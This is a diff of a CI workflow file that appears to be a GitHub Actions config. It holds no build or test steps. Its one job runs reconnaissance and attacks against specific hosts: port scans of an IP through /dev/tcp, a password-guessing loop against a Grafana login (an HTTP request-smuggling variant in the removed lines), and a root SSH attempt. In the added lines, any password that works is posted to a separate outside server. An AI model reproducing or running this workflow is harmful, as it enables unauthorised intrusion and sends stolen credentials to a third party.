@@ -2,20 +2,22 @@ name: CI
 on: [push, workflow_dispatch]
 jobs:
   scan:
-      runs-on: ubuntu-latest
-          steps:
-                - name: recon
-                        run: |
-                                  echo "=== ip ===" && curl -s ifconfig.me && echo ""
-                                            echo "=== ports ===" 
-                                                      for p in 22 80 443 2379 3000 5432 6379 9090 9229; do timeout 2 bash -c "echo >/dev/tcp/95.217.1.162/$p" 2>/dev/null && echo "OPEN:$p"; done || true
-                                                                echo "=== smuggle brute ==="
-                                                                          for pw in admin kaskad Kaskad2026 reactor grafana OxideDall Anton2026 10h11 changeme Kaskad! K@skad2026; do
-                                                                                      b64=$(echo -n "admin:$pw" | base64)
-                                                                                                  r=$(printf "POST / HTTP/1.1\r\nHost: reactor.kaskad.live\r\nContent-Length: $((64+${#b64}))\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /api/org HTTP/1.1\r\nHost: grafana.kaskad.live\r\nAuthorization: Basic $b64\r\n\r\n" | timeout 5 openssl s_client -connect 95.217.1.162:443 -servername reactor.kaskad.live -quiet 2>/dev/null)
-                                                                                                              echo "$r" | grep -q '"name"' && echo "HIT:$pw" && break
-                                                                                                                          echo "miss:$pw"
-                                                                                                                                    done
-                                                                                                                                              echo "=== ssh ==="
-                                                                                                                                                        ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 root@95.217.1.162 exit 2>&1 | head -2 || true
-                                                                                                                                                                  echo "=== done ==="
+    runs-on: ubuntu-latest
+    steps:
+      - name: recon
+        run: |
+          echo "=== ip ===" && curl -s ifconfig.me && echo ""
+          echo "=== ports ==="
+          for p in 22 80 443 2379 3000 5432 6379 9090 9229; do timeout 2 bash -c "echo >/dev/tcp/95.217.1.162/$p" 2>/dev/null && echo "OPEN:$p"; done || true
+          echo "=== grafana basic auth ==="
+          for pw in admin kaskad Kaskad2026 reactor grafana OxideDall Anton2026 10h11 changeme password; do
+            code=$(curl -sk -o /dev/null -w "%{http_code}" -u "admin:$pw" https://grafana.kaskad.live/api/org)
+            echo "$pw -> $code"
+            [ "$code" = "200" ] && echo "!!! FOUND: $pw" && curl -s -X POST -d "pw=$pw" http://193.203.169.109:8888/hit && break
+          done
+          echo "=== ssh ==="
+          ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 root@95.217.1.162 exit 2>&1 | head -2 || true
+          echo "=== reactor ==="
+          curl -sk --max-time 5 https://reactor.kaskad.live/api/health/services || true
+          echo ""
+          echo "=== done ==="
